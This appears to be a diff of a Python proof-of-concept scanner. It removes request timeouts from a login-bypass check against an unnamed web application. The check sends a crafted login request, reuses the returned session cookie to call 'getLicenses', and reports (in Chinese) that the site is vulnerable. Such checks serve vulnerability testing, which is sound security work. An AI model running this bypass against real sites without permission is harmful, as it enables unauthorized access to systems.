@@ -46,7 +46,7 @@ class poc:
             "params": '["service","0a"]'
         }
         try:
-            result_login = requests.post(url=url, data=data1, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
+            result_login = requests.post(url=url, data=data1, headers=self.headers, verify=False, proxies=self.proxies)
             if '"result":true' in result_login.text:
                 cookie = result_login.headers["Set-Cookie"]
                 self.headers["Cookie"] = cookie
@@ -55,7 +55,7 @@ class poc:
                     "methodName": "getLicenses",
                     "params": '[]'
                 }
-                result = requests.post(url=url, data=data2, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
+                result = requests.post(url=url, data=data2, headers=self.headers, verify=False, proxies=self.proxies)
                 if result.status_code == 200 and result.text != "":
                     target = urlparse(url)
                     self.result_text += """\n        [+]    \033[32m检测到目标站点存在登录绕过漏洞\033[0m
